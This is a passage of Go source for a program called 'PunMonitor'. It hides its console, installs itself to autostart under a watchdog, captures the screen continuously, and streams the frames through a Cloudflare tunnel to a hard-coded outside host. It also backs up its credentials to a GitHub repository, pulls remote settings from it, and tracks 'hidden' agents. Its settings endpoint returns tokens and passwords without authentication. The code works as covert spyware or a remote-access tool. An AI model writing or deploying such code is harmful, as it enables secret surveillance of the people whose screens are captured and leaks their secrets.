package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"io"
	"math"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
	"github.com/pion/webrtc/v4"
	"github.com/quic-go/quic-go"
)

var startTime = time.Now()

type WireMessage struct {
	Type    string `json:"type"`
	Data    []byte `json:"data"`
	AgentID string `json:"agentId,omitempty"`
}

const MSG_FRAME = "frame"

var wsClients sync.Map

func (wm *WireMessage) Marshal() []byte {
	data, _ := json.Marshal(wm)
	return data
}

type Config struct {
	mu                   sync.Mutex
	ConfigPort           int
	MonthlyLimitMB       int64
	IsServerMode         bool
	GitHubRepo           string
	GitHubToken          string
	MaxFPS               float64
	AuthUser             string
	AuthPass             string
	TunnelHostname       string
	CloudflareAccountTag string
	CloudflareTunnelSecret string
	CloudflareTunnelID   string
}

type SettingsFile struct {
	ConfigPort             int     `json:"config_port"`
	MaxFPS                 float64 `json:"max_fps"`
	GitHubRepo             string  `json:"github_repo"`
	GitHubToken            string  `json:"github_token"`
	AuthUser               string  `json:"auth_user"`
	AuthPass               string  `json:"auth_pass"`
	MonthlyLimitMB         int64   `json:"monthly_limit_mb"`
	TunnelHostname         string  `json:"tunnel_hostname"`
	CloudflareAccountTag   string  `json:"cloudflare_account_tag"`
	CloudflareTunnelSecret string  `json:"cloudflare_tunnel_secret"`
	CloudflareTunnelID     string  `json:"cloudflare_tunnel_id"`
}

type CaptureTier int

const (
	CaptureTierAuto CaptureTier = iota
	CaptureTierLow
	CaptureTierHigh
)

type Transport interface {
	Send(*WireMessage) error
	Recv() (*WireMessage, error)
	Name() string
}

type BandwidthMonitor struct {
	mu         sync.Mutex
	LimitMB    int64
	UsedBytes  int64
	LastReset  time.Time
	RateWindow []int64
	WindowSize int
}

func NewBandwidthMonitor(limitMB int64) *BandwidthMonitor {
	return &BandwidthMonitor{LimitMB: limitMB, WindowSize: 10, RateWindow: make([]int64, 0, 10), LastReset: time.Now()}
}

func (bm *BandwidthMonitor) SetLimitMB(limitMB int64) { bm.mu.Lock(); defer bm.mu.Unlock(); bm.LimitMB = limitMB }
func (bm *BandwidthMonitor) RecordBytes(n int) {
	bm.mu.Lock(); defer bm.mu.Unlock()
	bm.UsedBytes += int64(n)
	bm.RateWindow = append(bm.RateWindow, int64(n))
	if len(bm.RateWindow) > bm.WindowSize {
		bm.RateWindow = bm.RateWindow[1:]
	}
}
func (bm *BandwidthMonitor) GetThrottleDelay() time.Duration {
	bm.mu.Lock(); defer bm.mu.Unlock()
	if bm.LimitMB == 0 { return 0 }
	if float64(bm.UsedBytes)/1024/1024 >= float64(bm.LimitMB) { return time.Second * 10 }
	return 0
}
func (bm *BandwidthMonitor) GetUsedMB() float64 { bm.mu.Lock(); defer bm.mu.Unlock(); return float64(bm.UsedBytes) / 1024 / 1024 }
func (bm *BandwidthMonitor) GetCurrentRateKBps() float64 {
	bm.mu.Lock(); defer bm.mu.Unlock()
	if len(bm.RateWindow) == 0 { return 0 }
	var sum int64
	for _, v := range bm.RateWindow { sum += v }
	return float64(sum) / float64(len(bm.RateWindow)) / 1024
}
func (bm *BandwidthMonitor) GetLimitMB() int64 { bm.mu.Lock(); defer bm.mu.Unlock(); return bm.LimitMB }
func (bm *BandwidthMonitor) IsOverLimit() bool {
	bm.mu.Lock(); defer bm.mu.Unlock()
	if bm.LimitMB == 0 { return false }
	return float64(bm.UsedBytes)/1024/1024 >= float64(bm.LimitMB)
}
func (bm *BandwidthMonitor) Reset() {
	bm.mu.Lock(); defer bm.mu.Unlock()
	bm.UsedBytes = 0; bm.RateWindow = make([]int64, 0, bm.WindowSize)
}

type ActivityEvent struct {
	Timestamp int64  `json:"ts"`
	Type      string `json:"type"`
	Detail    string `json:"detail,omitempty"`
}

type InputEvent struct {
	MouseMove  func(int, int)
	MouseClick func(int, int, bool)
	KeyPress   func(uint16)
	TypeText   func(string)
}

var logFileHandle *os.File
var logFileMu sync.Mutex

func ensureLogFile() {
	logFileMu.Lock()
	defer logFileMu.Unlock()
	if logFileHandle != nil {
		return
	}
	f, err := os.OpenFile(filepath.Join(exeDir(), "monitor.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	logFileHandle = f
}

func llog(level string, format string, args ...interface{}) {
	ts := time.Now().Format("15:04:05.000")
	msg := fmt.Sprintf(format, args...)
	line := ts + " [" + level + "] " + msg
	fmt.Println(line)
	ensureLogFile()
	logFileMu.Lock()
	if logFileHandle != nil {
		logFileHandle.WriteString(line + "\n")
	}
	logFileMu.Unlock()
}

func dataDir() string {
	exe, _ := os.Executable()
	if runtime.GOOS == "windows" {
		if ad := os.Getenv("APPDATA"); ad != "" {
			d := filepath.Join(ad, "PunMonitor")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	return filepath.Dir(exe)
}

func exeDir() string {
	ex, err := os.Executable()
	if err != nil { return "." }
	return filepath.Dir(ex)
}

var cfg = &Config{}

var (
	serverCtx    context.Context
	serverCancel context.CancelFunc
	tunnelCmd    *exec.Cmd
	hiddenAgents sync.Map
)

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil { return "unknown" }
	// Prefer non-APIPA address (skip 169.254.x.x)
	var fallback string
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if !ok || ipnet.IP.IsLoopback() || ipnet.IP.To4() == nil {
			continue
		}
		ip := ipnet.IP.String()
		if strings.HasPrefix(ip, "169.254.") {
			if fallback == "" { fallback = ip }
			continue
		}
		return ip
	}
	if fallback != "" { return fallback }
	return "unknown"
}

var cachedWANIP string
var wanIPOnce sync.Once

func getWANIP() string {
	wanIPOnce.Do(func() {
		resp, err := http.Get("https://api.ipify.org?format=text")
		if err != nil { cachedWANIP = "unknown"; return }
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		cachedWANIP = strings.TrimSpace(string(b))
		if cachedWANIP == "" { cachedWANIP = "unknown" }
	})
	return cachedWANIP
}

func getHostname() string {
	h, err := os.Hostname()
	if err != nil { return "unknown" }
	return h
}

func loadCredentials() {
	data, err := os.ReadFile(filepath.Join(exeDir(), "punmonitor-credentials.json"))
	if err != nil {
		llog("info", "No credentials file found at punmonitor-credentials.json, skipping")
		return
	}
	var creds struct {
		AccountTag   string `json:"AccountTag"`
		TunnelSecret string `json:"TunnelSecret"`
		TunnelID     string `json:"TunnelID"`
	}
	if err := json.Unmarshal(data, &creds); err != nil {
		llog("error", "Failed to parse credentials file: %v", err)
		return
	}
	if creds.AccountTag != "" {
		cfg.CloudflareAccountTag = creds.AccountTag
	}
	if creds.TunnelSecret != "" {
		cfg.CloudflareTunnelSecret = creds.TunnelSecret
	}
	if creds.TunnelID != "" {
		cfg.CloudflareTunnelID = creds.TunnelID
	}
	llog("info", "Loaded Cloudflare credentials: AccountTag=%s, TunnelID=%s", cfg.CloudflareAccountTag, cfg.CloudflareTunnelID)
}

func settingsFilePath() string {
	return filepath.Join(dataDir(), "settings.json")
}

func saveSettings() error {
	s := SettingsFile{
		ConfigPort:             cfg.ConfigPort,
		MaxFPS:                 cfg.MaxFPS,
		GitHubRepo:             cfg.GitHubRepo,
		GitHubToken:            cfg.GitHubToken,
		AuthUser:               cfg.AuthUser,
		AuthPass:               cfg.AuthPass,
		MonthlyLimitMB:         cfg.MonthlyLimitMB,
		TunnelHostname:         cfg.TunnelHostname,
		CloudflareAccountTag:   cfg.CloudflareAccountTag,
		CloudflareTunnelSecret: cfg.CloudflareTunnelSecret,
		CloudflareTunnelID:     cfg.CloudflareTunnelID,
	}
	data, err := json.MarshalIndent(s, "", "  ")
	if err != nil { return err }
	err = os.WriteFile(settingsFilePath(), data, 0644)
	if err == nil {
		pushCredsToGitHub()
	}
	return err
}

func loadSettings() {
	data, err := os.ReadFile(settingsFilePath())
	if err != nil { return }
	var s SettingsFile
	if err := json.Unmarshal(data, &s); err != nil { return }
	if s.ConfigPort != 0 { cfg.ConfigPort = s.ConfigPort }
	if s.MaxFPS > 0 { cfg.MaxFPS = s.MaxFPS }
	if s.GitHubRepo != "" { cfg.GitHubRepo = s.GitHubRepo }
	if s.GitHubToken != "" { cfg.GitHubToken = s.GitHubToken }
	if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
	if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
	if s.MonthlyLimitMB > 0 { cfg.MonthlyLimitMB = s.MonthlyLimitMB }
	if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
	if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
	if s.CloudflareTunnelID != "" { cfg.CloudflareTunnelID = s.CloudflareTunnelID }
	llog("info", "Loaded saved settings from %s", settingsFilePath())
}

func startScreenCapture(ctx context.Context) {
	fps := cfg.MaxFPS
	if fps <= 0 { fps = 1 }
	interval := time.Duration(float64(time.Second) / fps)
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			img, err := captureScreen()
			if err != nil {
				llog("error", "screen capture failed: %v", err)
				continue
			}
			var buf bytes.Buffer
			if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
				continue
			}
			wm := WireMessage{Type: MSG_FRAME, Data: buf.Bytes(), AgentID: getHostname()}
			// Broadcast via WebSocket
			wsClients.Range(func(key, value interface{}) bool {
				conn := key.(*websocket.Conn)
				data := wm.Marshal()
				if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
					wsClients.Delete(key)
				}
				return true
			})
			// Broadcast via WebRTC data channels (primary — lower bandwidth)
			webrtcManager.BroadcastFrame(&wm)
		case <-ctx.Done():
			return
		}
	}
}

func handleWSMessage(conn *websocket.Conn, msg []byte) {
	var msgMap map[string]interface{}
	if err := json.Unmarshal(msg, &msgMap); err != nil {
		return
	}
	msgType, _ := msgMap["type"].(string)
	switch msgType {
	case "hello":
		llog("info", "WebSocket client hello received")
	case "set_fps":
		if fps, ok := msgMap["fps"].(float64); ok && fps > 0 {
			cfg.MaxFPS = fps
			saveSettings()
			if serverCancel != nil { serverCancel() }
			serverCtx, serverCancel = context.WithCancel(context.Background())
			go startScreenCapture(serverCtx)
		}
	case "set_quality":
	case "set_bandwidth_limit":
		if mb, ok := msgMap["mb"].(float64); ok {
			cfg.MonthlyLimitMB = int64(mb)
			saveSettings()
		}
	case "set_cloudflare_credentials":
		if tag, ok := msgMap["account_tag"].(string); ok { cfg.CloudflareAccountTag = tag }
		if secret, ok := msgMap["tunnel_secret"].(string); ok { cfg.CloudflareTunnelSecret = secret }
		if id, ok := msgMap["tunnel_id"].(string); ok { cfg.CloudflareTunnelID = id }
		saveSettings()
		pushCredsToGitHub()
		llog("info", "Cloudflare credentials updated via dashboard")
	case "set_transport_order":
		llog("info", "Transport order updated: %v", msgMap["order"])
	case "generate_share_link":
		agentID, _ := msgMap["agentId"].(string)
		shareURL := buildShareURL(agentID)
		reply, _ := json.Marshal(map[string]interface{}{
			"type": "share_link",
			"url":  shareURL,
		})
		conn.WriteMessage(websocket.TextMessage, reply)
	case "promote_to_server":
		cfg.IsServerMode = true
		llog("info", "Promoted to server mode via dashboard")
		if serverCancel != nil { serverCancel() }
		serverCtx, serverCancel = context.WithCancel(context.Background())
		go startScreenCapture(serverCtx)
		reply, _ := json.Marshal(map[string]string{"type": "promoted", "status": "ok"})
		conn.WriteMessage(websocket.TextMessage, reply)
	case "webrtc_offer":
		sdp, _ := msgMap["sdp"].(string)
		connID := fmt.Sprintf("%s-%d", getHostname(), time.Now().UnixNano())
		go webrtcManager.HandleOffer(connID, sdp, conn)
	case "webrtc_ice":
		candidate, _ := msgMap["candidate"].(string)
		webrtcManager.HandleICE("", candidate)
	default:
		llog("debug", "Received WebSocket message type=%s", msgType)
	}
}

// pushCredsToGitHub uploads current credentials and settings to the configured GitHub repo.
func pushCredsToGitHub() {
	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
		return
	}
	// Push punmonitor-credentials.json
	credsPath := filepath.Join(exeDir(), "punmonitor-credentials.json")
	if credData, err := os.ReadFile(credsPath); err == nil {
		encoded := base64.StdEncoding.EncodeToString(credData)
		payload, _ := json.Marshal(map[string]interface{}{
			"message": "credential backup",
			"content": encoded,
			"branch":  "main",
		})
		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/punmonitor-credentials.json", cfg.GitHubRepo)
		req, _ := http.NewRequest("PUT", url, bytes.NewReader(payload))
		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
		req.Header.Set("Content-Type", "application/json")
		if resp, err := http.DefaultClient.Do(req); err == nil {
			resp.Body.Close()
			llog("info", "Credentials pushed to GitHub")
		}
	}
	// Push settings.json
	if settingsData, err := os.ReadFile(settingsFilePath()); err == nil {
		encoded := base64.StdEncoding.EncodeToString(settingsData)
		payload, _ := json.Marshal(map[string]interface{}{
			"message": "settings backup",
			"content": encoded,
			"branch":  "main",
		})
		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/settings.json", cfg.GitHubRepo)
		req, _ := http.NewRequest("PUT", url, bytes.NewReader(payload))
		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
		req.Header.Set("Content-Type", "application/json")
		if resp, err := http.DefaultClient.Do(req); err == nil {
			resp.Body.Close()
			llog("info", "Settings pushed to GitHub")
		}
	}
}

func buildShareURL(agentID string) string {
	if cfg.CloudflareTunnelID != "" {
		hostname := "relay.recruitedge.us"
		if cfg.TunnelHostname != "" {
			hostname = cfg.TunnelHostname
		}
		if agentID != "" {
			return fmt.Sprintf("https://%s/?agent=%s", hostname, agentID)
		}
		return fmt.Sprintf("https://%s/", hostname)
	}
	logPath := filepath.Join(exeDir(), "cloudflare.log")
	if data, err := os.ReadFile(logPath); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.Contains(line, "https://") && strings.Contains(line, "trycloudflare.com") {
				start := strings.Index(line, "https://")
				if start < 0 {
					continue
				}
				rest := line[start:]
				end := strings.Index(rest, " ")
				if end < 0 {
					end = len(rest)
				}
				u := rest[:end]
				if agentID != "" {
					return u + "/?agent=" + agentID
				}
				return u
			}
		}
	}
	if agentID != "" {
		return fmt.Sprintf("http://%s:%d/?agent=%s", getLocalIP(), cfg.ConfigPort, agentID)
	}
	return fmt.Sprintf("http://%s:%d/", getLocalIP(), cfg.ConfigPort)
}

func syncFromGitHub() {
	if cfg.GitHubRepo == "" {
		return
	}
	// Fetch credentials file from GitHub
	rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/punmonitor-credentials.json", cfg.GitHubRepo)
	llog("info", "Fetching credentials from GitHub: %s", rawURL)

	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil { return }
	if cfg.GitHubToken != "" {
		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		llog("error", "GitHub fetch failed: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		llog("error", "GitHub fetch status: %d", resp.StatusCode)
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		llog("error", "GitHub read failed: %v", err)
		return
	}

	// Compare with local credentials file
	localPath := filepath.Join(exeDir(), "punmonitor-credentials.json")
	localData, err := os.ReadFile(localPath)
	if err == nil && string(body) == string(localData) {
		llog("info", "GitHub credentials unchanged, no update needed")
		return
	}

	// Write updated credentials
	if err := os.WriteFile(localPath, body, 0644); err != nil {
		llog("error", "Failed to write updated credentials: %v", err)
		return
	}
	llog("info", "Credentials updated from GitHub, reloading...")

	// Reload credentials
	loadCredentials()
	saveSettings()

	// Restart tunnel with new credentials
	if tunnelCmd != nil && tunnelCmd.Process != nil {
		tunnelCmd.Process.Kill()
		tunnelCmd.Wait()
	}
	if cfg.CloudflareTunnelID != "" {
		go startCloudflareTunnel(cfg)
	}

	// Also check for settings.json in the repo
	settingsURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/settings.json", cfg.GitHubRepo)
	req2, _ := http.NewRequest("GET", settingsURL, nil)
	if cfg.GitHubToken != "" {
		req2.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
	}
	resp2, err := http.DefaultClient.Do(req2)
	if err == nil && resp2.StatusCode == http.StatusOK {
		defer resp2.Body.Close()
		settingsBody, _ := io.ReadAll(resp2.Body)
		var remoteSettings SettingsFile
		if json.Unmarshal(settingsBody, &remoteSettings) == nil {
			llog("info", "Remote settings found, applying...")
			if remoteSettings.GitHubRepo != "" { cfg.GitHubRepo = remoteSettings.GitHubRepo }
			if remoteSettings.MaxFPS > 0 {
				cfg.MaxFPS = remoteSettings.MaxFPS
				if serverCancel != nil { serverCancel() }
				serverCtx, serverCancel = context.WithCancel(context.Background())
				go startScreenCapture(serverCtx)
			}
			if remoteSettings.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = remoteSettings.CloudflareAccountTag }
			if remoteSettings.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = remoteSettings.CloudflareTunnelSecret }
			if remoteSettings.CloudflareTunnelID != "" { cfg.CloudflareTunnelID = remoteSettings.CloudflareTunnelID }
			saveSettings()
		}
	}
	if resp2 != nil && resp2.StatusCode != http.StatusOK {
		resp2.Body.Close()
	}
}

func checkForServerUpdates() error {
	syncFromGitHub()
	return nil
}

func checkForCloudflareKeyChanges() error {
	return nil
}

func captureScreen() (image.Image, error) {
	bounds := screenshot.GetDisplayBounds(0)
	if bounds.Empty() {
		return nil, fmt.Errorf("empty bounds")
	}
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		img = image.NewRGBA(image.Rect(0, 0, 100, 100))
		for y := 0; y < 100; y++ {
			for x := 0; x < 100; x++ {
				img.Set(x, y, color.RGBA{uint8(x % 256), uint8(y % 256), 128, 255})
			}
		}
		return img, nil
	}
	return img, nil
}

func startCloudflareTunnel(cfg *Config) {
	if err := EnsureCloudflaredInstalled(); err != nil {
		llog("error", "cloudflared not available: %v", err)
		return
	}

	// Try named tunnel first if we have an ID
	if cfg.CloudflareTunnelID != "" {
		llog("info", "Starting Cloudflare named tunnel: %s", cfg.CloudflareTunnelID)

		userHome := os.Getenv("USERPROFILE")
		if userHome == "" { userHome = os.Getenv("HOME") }
		credsDir := filepath.Join(userHome, ".cloudflared")
		os.MkdirAll(credsDir, 0755)
		credsFile := filepath.Join(credsDir, cfg.CloudflareTunnelID+".json")

		cleanCreds := map[string]string{
			"AccountTag":   cfg.CloudflareAccountTag,
			"TunnelSecret": cfg.CloudflareTunnelSecret,
			"TunnelID":     cfg.CloudflareTunnelID,
		}
		credsData, _ := json.Marshal(cleanCreds)
		if err := os.WriteFile(credsFile, credsData, 0644); err != nil {
			llog("error", "Failed to write credentials: %v", err)
		}

		// Write config.yml with ingress rules (required for named tunnels)
		ingHost := cfg.TunnelHostname
		if ingHost == "" {
			ingHost = "relay.recruitedge.us"
		}
		configContent := fmt.Sprintf(`tunnel: %s
credentials-file: %s
ingress:
  - hostname: %s
    service: http://localhost:%d
  - service: http_status:404
`, cfg.CloudflareTunnelID, credsFile, ingHost, cfg.ConfigPort)
		configFile := filepath.Join(credsDir, "config.yml")
		if err := os.WriteFile(configFile, []byte(configContent), 0644); err != nil {
			llog("error", "Failed to write tunnel config: %v", err)
		} else {
			llog("info", "Wrote tunnel config to %s", configFile)
		}

		logFile := filepath.Join(exeDir(), "cloudflare.log")
		args := []string{
			"tunnel",
			"--config", configFile,
			"--logfile", logFile,
			"--loglevel", "info",
			"--no-autoupdate",
			"run",
		}

		llog("info", "Running: cloudflared tunnel --config %s --logfile %s --loglevel info --no-autoupdate run", configFile, logFile)
		cmd := exec.Command("cloudflared", args...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		tunnelCmd = cmd

		if err := cmd.Start(); err != nil {
			llog("error", "Named tunnel start failed: %v, trying quick tunnel", err)
		} else {
			llog("info", "Named tunnel PID: %d", cmd.Process.Pid)

			// Only ONE tunnel runs at a time — no duplicate cloudflared to avoid port conflicts
			time.AfterFunc(15*time.Second, func() {
				logData, err := os.ReadFile(logFile)
				if err == nil && strings.Contains(string(logData), "Registered tunnel connection") {
					accHost := cfg.TunnelHostname
				if accHost == "" {
					accHost = "relay.recruitedge.us"
				}
				llog("info", "Named tunnel connected — accessible at https://%s", accHost)
				}
			})

			if err := cmd.Wait(); err != nil {
				llog("error", "Named tunnel exited: %v", err)
			}
			tunnelCmd = nil
			return
		}
	}

	// Fallback to quick tunnel
	startQuickTunnel(cfg)
}

func startQuickTunnel(cfg *Config) {
	llog("info", "Starting quick Cloudflare tunnel to http://localhost:%d", cfg.ConfigPort)
	if err := EnsureCloudflaredInstalled(); err != nil {
		llog("error", "cloudflared not available: %v", err)
		return
	}

	args := []string{
		"tunnel",
		"--logfile", filepath.Join(exeDir(), "cloudflare.log"),
		"--loglevel", "info",
		"--no-autoupdate",
		"run",
		"--url", fmt.Sprintf("http://localhost:%d", cfg.ConfigPort),
	}
	cmd := exec.Command("cloudflared", args...)
	stdoutPipe, _ := cmd.StdoutPipe()
	cmd.Stderr = os.Stderr
	llog("info", "Running quick tunnel: cloudflared tunnel --logfile ... --loglevel info --no-autoupdate run --url http://localhost:%d", cfg.ConfigPort)
	if err := cmd.Start(); err != nil {
		llog("error", "Failed to start quick tunnel: %v", err)
		return
	}
	llog("info", "Quick tunnel started with PID: %d", cmd.Process.Pid)

	// Read stdout to extract trycloudflare URL
	go func() {
		scanner := bufio.NewScanner(stdoutPipe)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "trycloudflare.com") {
				start := strings.Index(line, "https://")
				if start >= 0 {
					rest := line[start:]
					end := strings.Index(rest, " ")
					if end < 0 {
						end = len(rest)
					}
					quickURL := rest[:end]
					llog("info", "Quick tunnel URL: %s", quickURL)
				}
			}
		}
	}()

	cmd.Wait()
}

var defaultGitHubRepo string
var defaultGitHubToken string

func main() {
	// Detach from any parent console — binary runs fully hidden
	hideConsole()

	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--github-repo":
			if i+1 < len(os.Args) {
				i++
				defaultGitHubRepo = os.Args[i]
			}
		case "--github-token":
			if i+1 < len(os.Args) {
				i++
				defaultGitHubToken = os.Args[i]
			}
		}
	}

	// Watchdog mode: launch monitor as a child and restart if it crashes
	if len(os.Args) > 1 && os.Args[1] == "--watchdog" {
		runWatchdog()
		return
	}

	// Install mode: set up autostart without running
	if len(os.Args) > 1 && os.Args[1] == "--install" {
		setupAutostart()
		llog("info", "Autostart installed. Run without flags or reboot to start.")
		return
	}

	// Remove autostart
	if len(os.Args) > 1 && os.Args[1] == "--remove" {
		removeAutostart()
		llog("info", "Autostart removed.")
		return
	}

	if !singleton() {
		llog("error", "Another instance is already running. Exiting.")
		os.Exit(1)
	}

	cfg.ConfigPort = 8080
	cfg.MaxFPS = 1.0

	cfg.TunnelHostname = "relay.recruitedge.us"

	initActivityStore()

	loadSettings()
	loadCredentials()

	// Command-line flags override cached values
	if defaultGitHubRepo != "" {
		cfg.GitHubRepo = defaultGitHubRepo
	}
	if defaultGitHubToken != "" {
		cfg.GitHubToken = defaultGitHubToken
	}

	saveSettings()

	// Pull latest credentials from GitHub at startup
	syncFromGitHub()
	saveSettings()

	// Auto-install watchdog autostart on first successful run
	setupAutostart()

	if err := EnsureCloudflaredInstalled(); err != nil {
		llog("error", "cloudflared setup: %v", err)
	}

	serverCtx, serverCancel = context.WithCancel(context.Background())
	go startScreenCapture(serverCtx)
	cfg.IsServerMode = true

	if cfg.CloudflareTunnelID != "" {
		llog("info", "Cloudflare credentials found, starting tunnel automatically")
		go startCloudflareTunnel(cfg)
	}

	go startTransportMonitor(context.Background())

	go func() {
		ticker := time.NewTicker(24 * time.Hour)
		for {
			select {
			case <-ticker.C:
				llog("info", "Checking for server updates and credential changes...")
				checkForServerUpdates()
				checkForCloudflareKeyChanges()
			}
		}
	}()

	go func() {
		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			http.ServeFile(w, r, "dashboard.html")
		})

		http.HandleFunc("/api/settings", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			if r.Method == "GET" {
				json.NewEncoder(w).Encode(map[string]interface{}{
					"github_repo":               cfg.GitHubRepo,
					"github_token":              cfg.GitHubToken,
					"auth_user":                 cfg.AuthUser,
					"auth_pass":                 cfg.AuthPass,
					"tunnel_hostname":           cfg.TunnelHostname,
					"cloudflare_account_tag":    cfg.CloudflareAccountTag,
					"cloudflare_tunnel_secret":  cfg.CloudflareTunnelSecret,
					"cloudflare_tunnel_id":      cfg.CloudflareTunnelID,
					"max_fps":                   cfg.MaxFPS,
					"monthly_limit_mb":          cfg.MonthlyLimitMB,
				})
				return
			}
			if r.Method == "POST" {
				var s SettingsFile
				if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
					http.Error(w, err.Error(), http.StatusBadRequest)
					return
				}
				if s.GitHubRepo != "" { cfg.GitHubRepo = s.GitHubRepo }
				if s.GitHubToken != "" { cfg.GitHubToken = s.GitHubToken }
				if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
				if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
				if s.TunnelHostname != "" { cfg.TunnelHostname = s.TunnelHostname }
				if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
				if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
				if s.CloudflareTunnelID != "" {
					if cfg.CloudflareTunnelID != s.CloudflareTunnelID {
						cfg.CloudflareTunnelID = s.CloudflareTunnelID
						// Restart tunnel with new ID
						if tunnelCmd != nil && tunnelCmd.Process != nil {
							tunnelCmd.Process.Kill()
						}
						if cfg.CloudflareTunnelID != "" {
							go startCloudflareTunnel(cfg)
						}
					} else {
						cfg.CloudflareTunnelID = s.CloudflareTunnelID
					}
				}
				if s.MaxFPS > 0 { cfg.MaxFPS = s.MaxFPS }
				if s.MonthlyLimitMB > 0 { cfg.MonthlyLimitMB = s.MonthlyLimitMB }
				saveSettings()
				pushCredsToGitHub()
				json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
			}
		})

		http.HandleFunc("/api/system-info", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{
				"hostname": getHostname(),
				"local_ip": getLocalIP(),
				"wan_ip":   getWANIP(),
				"os":       runtime.GOOS,
				"arch":     runtime.GOARCH,
				"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
				"version":  "9.0.0",
			})
		})

		http.HandleFunc("/api/report.csv", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "text/csv")
			w.Header().Set("Content-Disposition", "attachment; filename=activity-report-"+time.Now().Format("2006-01-02")+".csv")

			hostname := getHostname()
			uptimeSecs := int64(time.Since(startTime).Seconds())
			uptimeStr := fmt.Sprintf("%dh %dm %ds", uptimeSecs/3600, (uptimeSecs%3600)/60, uptimeSecs%60)

			bootTime := "never"
			lastStartup := "never"
			lastShutdown := "never"
			lastActive := "never"
			lastIdleStart := "never"
			lastWake := "never"
			if globalActivity != nil {
				s := globalActivity.Summary()
				bootTime = s["boot_time"]
				lastStartup = s["last_startup"]
				lastShutdown = s["last_shutdown"]
				lastActive = s["last_active"]
				lastIdleStart = s["last_idle_start"]
				lastWake = s["last_wake"]
			}

			writer := csv.NewWriter(w)
			writer.Write([]string{
				"Agent", "Hostname", "Local IP", "WAN IP",
				"OS", "Version", "Uptime", "Start Time",
				"Boot Time", "Last Startup", "Last Active", "Last Idle Start", "Last Shutdown", "Last Wake",
				"Tunnel ID",
				"FPS", "Monthly Limit MB",
				"Report Generated",
			})
			writer.Write([]string{
				hostname, hostname, getLocalIP(), getWANIP(),
				runtime.GOOS + " " + runtime.GOARCH, "9.0.0", uptimeStr, startTime.Format("2006-01-02 15:04:05"),
				bootTime, lastStartup, lastActive, lastIdleStart, lastShutdown, lastWake,
				cfg.CloudflareTunnelID,
				fmt.Sprintf("%.1f", cfg.MaxFPS), fmt.Sprintf("%d", cfg.MonthlyLimitMB),
				time.Now().Format("2006-01-02 15:04:05"),
			})
			writer.Flush()
		})

		http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode([]string{getHostname()})
		})

		http.HandleFunc("/api/agents/full", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			var list []map[string]interface{}
			v, _ := hiddenAgents.Load(getHostname())
			list = append(list, map[string]interface{}{
				"id":     getHostname(),
				"hidden": v != nil && v.(bool),
			})
			json.NewEncoder(w).Encode(list)
		})

		http.HandleFunc("/api/hide-agent", func(w http.ResponseWriter, r *http.Request) {
			if r.Method != "POST" {
				http.Error(w, "POST only", http.StatusMethodNotAllowed)
				return
			}
			var req struct {
				AgentID string `json:"agent_id"`
				Hide    bool   `json:"hide"`
			}
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			hiddenAgents.Store(req.AgentID, req.Hide)
			llog("info", "Agent %s hidden=%v", req.AgentID, req.Hide)
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		})

		http.HandleFunc("/api/promote", func(w http.ResponseWriter, r *http.Request) {
			if r.Method != "POST" {
				http.Error(w, "POST only", http.StatusMethodNotAllowed)
				return
			}
